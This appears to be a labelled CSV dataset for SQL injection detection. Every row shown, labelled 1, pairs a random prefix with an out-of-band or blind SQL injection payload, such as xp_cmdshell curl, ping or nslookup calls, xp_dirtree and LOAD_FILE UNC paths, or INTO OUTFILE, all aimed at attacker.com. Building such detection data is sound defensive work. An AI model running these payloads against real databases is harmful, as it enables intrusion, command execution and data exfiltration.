content,label
价格 '; exec master..xp_fileexist '\\attacker.com\info'--,1
order 特点 '; exec master..xp_fileexist '\\attacker.com\info'--,1
推荐 query '; exec master..xp_fileexist '\\attacker.com\info'--,1
table 185 '; exec master..xp_cmdshell 'ping attacker.com'--,1
怎么样 '; exec master..xp_cmdshell 'ping attacker.com'--,1
2fojudp6te@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"prz85dx1jj@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"password 355 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"功能 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"什么是 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"特点 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"评测 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"9dxxb9@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"error 最新 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
样准带'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
q9bdpqx@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"91540@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"多少钱 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"i408t@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"好不好 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"ukdb9zoc45@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"lz3m9@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"没写引资条用种下白相三当路温布' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"2lhbzwv2hda@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"价格 profile ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"京志圆图' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"多少钱 warning 34 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"ioz6b720yqdm@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"0xaxz4tudo@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"确市本并员写时用再' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
干照二学增'; EXEC xp_dirtree '\\attacker.com\data'--,1
deek5d@'; EXEC xp_dirtree '\\attacker.com\data'--,1
cs1pmyn4c4r@'; EXEC xp_dirtree '\\attacker.com\data'--,1
优势 '; EXEC xp_dirtree '\\attacker.com\data'--,1
使用方法 '; EXEC xp_dirtree '\\attacker.com\data'--,1
多少钱 '; EXEC xp_fileexist '\\attacker.com\check'--,1
database 379 '; EXEC xp_fileexist '\\attacker.com\check'--,1
什么是 '; EXEC xp_fileexist '\\attacker.com\check'--,1
i5n17fe9ivyv@'; EXEC xp_fileexist '\\attacker.com\check'--,1
"admin 好不好 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"价格 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"构增片' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
象育造广我'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
order 好不好 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
vgglreicson@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
律温给育西干达起置'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
naaucvvep@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"老本战克具群工品识引今' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"持外最几心' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"怎么样 table ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"dfawk3i@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
w1bj8ptddio@'; exec master..xp_dirtree '\\attacker.com\data'--,1
c0p1wr41@'; exec master..xp_dirtree '\\attacker.com\data'--,1
最新 database '; exec master..xp_dirtree '\\attacker.com\data'--,1
此器整斗新前阶器示'; exec master..xp_dirtree '\\attacker.com\data'--,1
造样来有调全图积议关性天照则南'; exec master..xp_dirtree '\\attacker.com\data'--,1
增同术大团交加所它同持两命色种'; exec master..xp_fileexist '\\attacker.com\info'--,1
s2txgb@'; exec master..xp_fileexist '\\attacker.com\info'--,1
h5wp1q5x7zec@'; exec master..xp_fileexist '\\attacker.com\info'--,1
1hm949@'; exec master..xp_fileexist '\\attacker.com\info'--,1
评测 page 44 '; exec master..xp_cmdshell 'ping attacker.com'--,1
好不好 warning '; exec master..xp_cmdshell 'ping attacker.com'--,1
教程 '; exec master..xp_cmdshell 'ping attacker.com'--,1
眼直量些小习当'; exec master..xp_cmdshell 'ping attacker.com'--,1
"error 对比 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"最新 page 97 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"2kgsmay1@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"怎么样 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"0eq582u4@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
ki55ekb23@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
确质常电七此数'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"server 773 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"引较由九' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"速二府七给建信每业育北原' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"view 638 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"那直技它济只状本' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"un7n4@' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"优势 admin ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"无四管' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"2024 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"情如进教应织离安式子义道' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"时统局之图构观精难容实' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
最新 '; EXEC xp_dirtree '\\attacker.com\data'--,1
起按气基地如率整志共'; EXEC xp_dirtree '\\attacker.com\data'--,1
fail 使用方法 '; EXEC xp_dirtree '\\attacker.com\data'--,1
外正百近'; EXEC xp_dirtree '\\attacker.com\data'--,1
t8bpsve8mp@'; EXEC xp_fileexist '\\attacker.com\check'--,1
带文队问华情响易运任时国'; EXEC xp_fileexist '\\attacker.com\check'--,1
好不好 '; EXEC xp_fileexist '\\attacker.com\check'--,1
9lwatggprj@'; EXEC xp_fileexist '\\attacker.com\check'--,1
"tzgpf68acz@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"对比 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"m89b35w6onw@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"wz7vc1fg3k@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
比意备亲花难细几计太当又织处'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
功能 profile '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
druucmrqayn@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
步效水集型还影方保们此多打从置'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
哪里买 item '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"矿阶度里因红正条' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"database 725 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
最新 '; exec master..xp_dirtree '\\attacker.com\data'--,1
特点 '; exec master..xp_dirtree '\\attacker.com\data'--,1
调结证同质决第要算进米群'; exec master..xp_dirtree '\\attacker.com\data'--,1
队却约他记对增县'; exec master..xp_dirtree '\\attacker.com\data'--,1
物平文外员以众千资真风'; exec master..xp_dirtree '\\attacker.com\data'--,1
4jm3v8ak6d3@'; exec master..xp_fileexist '\\attacker.com\info'--,1
动一其'; exec master..xp_fileexist '\\attacker.com\info'--,1
p3aqpe@'; exec master..xp_fileexist '\\attacker.com\info'--,1
friswhws5auh@'; exec master..xp_cmdshell 'ping attacker.com'--,1
hsurivyjw87@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"nj519@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"年构山标些角' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"特点 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"success 教程 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"cgsg32fe8@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"对比 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"推荐 fail 98 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"制系海音构再等' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
fail 评测 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
dbk8sdj@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
65v709nm@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"万度按除' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"ik70oj8m@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"能们深什性' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"角办目写红走家酸料两提后' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"xmef2dvrqe@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"备权段接用就' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"2024 system ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"却广也非石支部克干单次有' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"warning 教程 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"test 如何 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"怎么样 setting ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"user 312 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"search 怎么样 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
jt9fsqxy@'; EXEC xp_dirtree '\\attacker.com\data'--,1
aqa24n@'; EXEC xp_dirtree '\\attacker.com\data'--,1
车收质'; EXEC xp_fileexist '\\attacker.com\check'--,1
条火好'; EXEC xp_fileexist '\\attacker.com\check'--,1
教程 '; EXEC xp_fileexist '\\attacker.com\check'--,1
使用方法 login '; EXEC xp_fileexist '\\attacker.com\check'--,1
"pot2ymhslcx@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"收主义' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
将条难育持上'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
最新 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
毛国形养写白'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
ebl8op8rponr@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"sgrvsh8@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"使用方法 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"v7hjjy8gch@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
哪里买 '; exec master..xp_dirtree '\\attacker.com\data'--,1
行中要件间第还全响象看适相往'; exec master..xp_dirtree '\\attacker.com\data'--,1
东世历十省个'; exec master..xp_dirtree '\\attacker.com\data'--,1
login 172 '; exec master..xp_fileexist '\\attacker.com\info'--,1
c3hbg27@'; exec master..xp_fileexist '\\attacker.com\info'--,1
对比 '; exec master..xp_fileexist '\\attacker.com\info'--,1
们名学习原之收角金百情市'; exec master..xp_fileexist '\\attacker.com\info'--,1
特点 table '; exec master..xp_cmdshell 'ping attacker.com'--,1
排名 '; exec master..xp_cmdshell 'ping attacker.com'--,1
"有的党样' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"最新 order 93 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"多少钱 ' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"也照般想山响' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"功能 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"什么是 warning ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"error 149 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"table 教程 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
e3odmdzcm8@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
美专心气劳'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
温西题没因研'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
fcyjwsi52ng@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"价格 user ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"cthqg7p70f3y@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"l6wessjqfo@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"运九商习区众本' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"面步七重七七' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"同育常什委月西级' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"评测 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"下载 item 65 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"database 305 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"推荐 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"下载 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"user 什么是 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"不进太组置报组即科青务名史由统' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"重型提重量上向本采者' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"profile 多少钱 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
哪里买 system 20 '; EXEC xp_dirtree '\\attacker.com\data'--,1
教程 '; EXEC xp_dirtree '\\attacker.com\data'--,1
西这算回各些面委历往东更克府来'; EXEC xp_fileexist '\\attacker.com\check'--,1
abhelv9q@'; EXEC xp_fileexist '\\attacker.com\check'--,1
多少钱 fail '; EXEC xp_fileexist '\\attacker.com\check'--,1
"最新 setting ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"1lqkflwlj8@' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
"功能 page 14 ' UNION SELECT NULL,NULL,NULL WHERE SLEEP(10) AND 1=LOAD_FILE('\\attacker.com\delay')--",1
qyk71@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
界法少特由我白'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
今天图是形展文值回直次何形该经'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
xr16q7j@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
info 828 '; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,1
"2024 ' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"g6iioh@' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"整际接' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"白多马节现带众得确按查主东使' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
"们增期指千间织类接世治题高调' UNION SELECT 1,2 FROM dual WHERE LOAD_FILE('\\attacker.com\leak')--",1
7uo9w91@'; exec master..xp_dirtree '\\attacker.com\data'--,1
总从里权解她上北四年照'; exec master..xp_dirtree '\\attacker.com\data'--,1
qd0gd@'; exec master..xp_dirtree '\\attacker.com\data'--,1
rho6kokjcu8v@'; exec master..xp_dirtree '\\attacker.com\data'--,1
0msm1f@'; exec master..xp_fileexist '\\attacker.com\info'--,1
对比 success '; exec master..xp_fileexist '\\attacker.com\info'--,1
集次先而五'; exec master..xp_fileexist '\\attacker.com\info'--,1
tdbdn2bo0@'; exec master..xp_fileexist '\\attacker.com\info'--,1
mf0mnoa@'; exec master..xp_cmdshell 'ping attacker.com'--,1
江由头离已月统常切整形'; exec master..xp_cmdshell 'ping attacker.com'--,1
ai5cs9t9f@'; exec master..xp_cmdshell 'ping attacker.com'--,1
"难支步发劳石手量千识事研定会' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"取专算约林包片制联置格正金自' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"6qp6kjt@' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"张传整国者取' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"实族候太立有条' UNION SELECT NULL,NULL WHERE 1=EXISTS(SELECT 1 FROM dual WHERE 1=LOAD_FILE('\\attacker.com\test'))--",1
"热成山商量放特再整该民动' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"jvfhzbmrputn@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"也采安省' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
教型中省九起族斯第'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
data 推荐 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
如何 info 60 '; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
f75a0@'; EXEC xp_cmdshell 'curl http://attacker.com/?data=leak'--,1
"mef90@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"达间出他形因较理步毛基区' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"account 什么是 ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"半集目没外用今合交' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"土况对了局他必元标连济候日花' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"data 哪里买 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"anfr0j8j4@' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"排名 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"server 203 ' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"权表济前局' UNION SELECT LOAD_FILE(CONCAT('\\',@@hostname,'.attacker.com\file'))--",1
"如何 view ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"别只少府验离' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"test 使用方法 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"教程 ' UNION SELECT 1,2 INTO OUTFILE '\\attacker.com\exfil.txt'--",1
"warning 229 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"接可当亲' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"sdiq94hh9@' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"他最包断需育子区里只' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
"些维极道期自期写决白力等' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\test.txt')--",1
推荐 '; EXEC xp_dirtree '\\attacker.com\data'--,1
wifplg@'; EXEC xp_dirtree '\\attacker.com\data'--,1
现表物农放京节如及'; EXEC xp_dirtree '\\attacker.com\data'--,1
推荐 server 70 '; EXEC xp_dirtree '\\attacker.com\data'--,1
1yeo0bqlyg@'; EXEC xp_fileexist '\\attacker.com\check'--,1
